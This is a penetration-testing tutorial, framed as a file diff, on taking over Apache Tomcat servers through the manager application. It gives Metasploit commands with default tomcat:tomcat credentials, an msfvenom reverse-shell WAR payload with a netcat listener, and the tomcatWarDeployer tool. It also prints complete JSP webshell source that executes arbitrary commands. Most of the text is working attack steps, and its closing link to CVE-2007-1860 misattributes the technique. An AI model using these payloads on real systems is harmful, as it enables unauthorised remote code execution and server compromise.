@@ -1,0 +1,116 @@
+
+
+nmap -sV -p8080 192.167.1.131(TEST IP... TRY YOURS)
+
+
+From nmap output result, we found port 8080 is open for Apache Tomcat. So we navigate to the web browser and on exploring Target IP: port we saw HTTP authentication page to login in tomcat manager application.
+
+
+
+Tomcat Manager Authenticated Upload Code Execution
+This module can be used to execute a payload on Apache Tomcat servers that have an exposed “manager” application. The payload is uploaded as a WAR archive containing a JSP application using a POST request against the /manager/html/upload component. NOTE: The compatible payload sets vary based on the selected target. For example, you must select the Windows target to use native Windows payloads.
+
+use exploit/multi/http/tomcat_mgr_upload
+msf exploit(multi/http/tomcat_mgr_upload) > set rhost 192.168.1.101
+msf exploit(multi/http/tomcat_mgr_upload) > set rport 8080
+msf exploit(multi/http/tomcat_mgr_upload) > set httpusername tomcat
+msf exploit(multi/http/tomcat_mgr_upload) > set httppassword tomcat
+msf exploit(multi/http/tomcat_mgr_upload) > exploit
+As result, you can observe that we have the meterpreter session of the target machine.
+
+
+
+Generate .war Format Backdoor
+We can use msfvenom for generating a .war format backdoor for java/jsp payload, all you need to do is just follow the given below syntax to create a .war format file and then run Netcat listener.
+
+Syntax: msfvenom -p [payload] LHOST=[Kali Linux IP] LPORT=[1234] -f [file format] > [file name]
+
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.108 LPORT=1234 -f war > shell.war
+nc -lvp 1234
+
+
+
+
+ 
+
+Now login to tomcat manager application using tomcat: tomcat as username: password. You will be welcomed by the admin dashboard where you can upload a .war file. 
+
+As you can observe I had browser the malicious shell.war file to be deployed as highlighted in the image. As soon as you will upload your file, you will see the /path entry for your file in the table of Applications
+
+To execute your .war file, you have to click on the /.war file path mention in the Application table. Or you can directly explore http://target_IP:port/file_name.
+
+As soon as you will execute your file you will get the reverse connection through netcat.
+
+
+
+Booom!!! One more time we have access to remote Server.
+
+
+
+Tomcat War Deployer Script
+This is a penetration testing tool intended to leverage Apache Tomcat credentials in order to automatically generate and deploy JSP Backdoor, as well as invoke it afterward and provide a nice shell (either via web GUI, listening port binded on the remote machine or as a reverse tcp payload connecting back to the adversary).
+
+In practice, it generates JSP backdoor WAR package on-the-fly and deploys it at the Apache Tomcat Manager Application, using valid HTTP Authentication credentials that pentester provided (or custom ones, in the end, we all love tomcat: tomcat )
+
+You can download it from here: https://github.com/mgeeky/tomcatWarDeployer
+
+git clone https://github.com/mgeeky/tomcatWarDeployer
+cd tomcatWarDeployer
+ls
+
+
+Now follow the syntax to exploit the target machine without uploading the .war file manually.
+
+Syntax : ./tomcatWarDeployer.py -U [usrename] -p [password]-H [Kali Linux IP]-p [Listening port] [target_IP]:[tomcat_port]
+
+./tomcatWarDeployer.py -U tomcat -P tomcat -H 192.168.1.108 -p 4567 192.168.1.101:8080
+On executing above command, I got webshell directly as you can observe it in the given below image.
+
+
+
+Generate a JSP Webshell
+In this part, we are going to see how we can generate and deploy a Web shell to gain command execution on the Tomcat manager application.
+
+First, we will need to write the Webshell and package it as a .war file format. To write the jsp Webshell, we are using the following code which I found from this Link: https://pentesterlab.com/exercises/cve-2007-1860/course
+
+<FORM METHOD=GET ACTION='index.jsp'>
+<INPUT name='cmd' type=text>
+<INPUT type=submit value='Run'>
+</FORM>
+<%@ page import="java.io.*" %>
+<%
+   String cmd = request.getParameter("cmd");
+   String output = "";
+   if(cmd != null) {
+      String s = null;
+      try {
+         Process p = Runtime.getRuntime().exec(cmd,null,null);
+         BufferedReader sI = new BufferedReader(new
+InputStreamReader(p.getInputStream()));
+         while((s = sI.readLine()) != null) { output += s+"</br>"; }
+      }  catch(IOException e) {   e.printStackTrace();   }
+   }
+%>
+<pre><%=output %></pre>
+Save the code as index.jsp and then execute the following command to package it as a .war file.
+
+mkdir webshell
+cp index.jsp webshell/
+cd webshell
+jar -cvf ../webshell.war *
+With the help of the above command, you will get a war file, which you can deploy in tomcat manager application.
+
+
+
+As you can observe from the given below image, I had deployed my webshell.war file which successfully uploaded, now let’s click on this file for its execution.
+
+
+
+On executing /webshell you will get an HTTP 404 error, now execute index.jsp file in the as given below:
+
+http://192.168.1.106:8080/webshell/index.jsp
+On executing the above URL you will get command execution form, now use it wisely to cmd commands.
+
+
+
+Hopefully! You have enjoyed this article how to get access to the Tomcat manager using CVE-2007-1860.
